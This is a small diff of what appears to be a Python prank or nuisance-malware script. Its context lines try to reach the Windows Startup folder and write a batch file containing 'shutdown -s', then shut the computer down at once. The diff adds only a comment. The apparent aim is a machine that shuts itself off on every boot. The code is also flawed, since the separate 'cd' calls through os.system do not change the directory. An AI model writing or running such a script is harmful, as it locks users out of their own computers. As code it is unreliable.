@@ -9,5 +9,7 @@ os.system("cd Start Menu")
 os.system("cd Programs")
 os.system("cd Startup")
 
+# creating the BATCH file and shutting the PC down
+
 os.system("echo shutdown -s > script.bat")
 os.system("shutdown -s")
